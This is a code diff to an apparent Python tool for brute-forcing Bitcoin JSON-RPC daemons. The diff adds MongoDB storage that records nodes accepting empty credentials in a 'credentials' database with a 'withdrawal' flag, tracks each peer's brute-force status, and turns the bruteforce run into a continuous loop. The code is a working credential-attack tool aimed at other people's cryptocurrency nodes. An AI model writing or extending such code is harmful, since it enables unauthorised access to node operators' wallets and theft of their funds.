@@ -12,6 +12,7 @@ from aiobitcoin import bitcoinerrors
 
 from src.extra import utils
 from src.extra.pymongodb import PyMongoDB
+from src.extra.aiomotor import AIOMotor
 
 
 class BruterBase:
@@ -129,9 +130,22 @@ class EmptyCredentialsChecker(BruterBase):
     def __init__(self, **kwargs):
         super(EmptyCredentialsChecker, self).__init__(**kwargs)
         self._read_timeout = kwargs.get('read_timeout')
-        self._loop = kwargs.get('loop')
 
-        self._loop.run_until_complete(self.check_peers_with_empty_creds())
+        self.async_mongo_creds = AIOMotor(db_name='credentials', uri=kwargs.get('mongo_uri'))
+        self.async_mongo_jsonrpc = AIOMotor(db_name='jsonrpc', uri=kwargs.get('mongo_uri'))
+
+    async def _update_brute_status(self, peer, status):
+        await self.async_mongo_jsonrpc.update_one(
+            find_data={'peer': peer},
+            update_data={'bruted': status},
+            collection=self.coin_name
+        )
+
+    async def _make_record(self, **kwargs):
+        await self.async_mongo_creds.insert_one(
+            document=kwargs,
+            collection=self.coin_name
+        )
 
     @staticmethod
     async def close_gram_sessions(grams):
@@ -157,6 +171,15 @@ class EmptyCredentialsChecker(BruterBase):
             await asyncio.wait_for(blockchain.get_difficulty(), self._wait_timeout)
         except bitcoinerrors.IncorrectCreds:
             pass
+        except bitcoinerrors.NoConnectionToTheDaemon:
+            await self._update_brute_status(host, 'NoConnectionToTheDaemon')
+            raise
+        except asyncio.futures.TimeoutError:
+            await self._update_brute_status(host, 'TimeoutError')
+            raise
+        else:
+            await self._make_record(uri=uri, withdrawal=False)
+            await self._update_brute_status(host, True)
 
     async def _checker_handler(self, non_checked_peers, grams):
         await asyncio.gather(
@@ -183,10 +206,8 @@ class EmptyCredentialsChecker(BruterBase):
         while True:
             try:
                 status_without_errs = await self._run_check_empty_by_block(grams)
-            except bitcoinerrors.NoConnectionToTheDaemon:
-                pass
-            except asyncio.futures.TimeoutError:
-                pass
+            except (bitcoinerrors.NoConnectionToTheDaemon, asyncio.futures.TimeoutError):
+                continue
             else:
                 if status_without_errs:
                     break
@@ -216,15 +237,13 @@ class JSONRPCBruter(EmptyCredentialsChecker):
 
     async def run_bruteforce(self):
         while True:
+            await self.check_peers_with_empty_creds()
             grams = [GramBitcoin(session_required=True) for _ in range(self.num_threads)]
 
             try:
                 await self._run_bruteforce_by_block(grams)
-            except bitcoinerrors.NoConnectionToTheDaemon:
-                pass
-            except asyncio.futures.TimeoutError:
-                pass
+            except (bitcoinerrors.NoConnectionToTheDaemon, asyncio.futures.TimeoutError):
+                continue
             finally:
                 await self.close_gram_sessions(grams)
-                # time.sleep(self._cycle_timeout)
-            break
+                time.sleep(self._cycle_timeout)
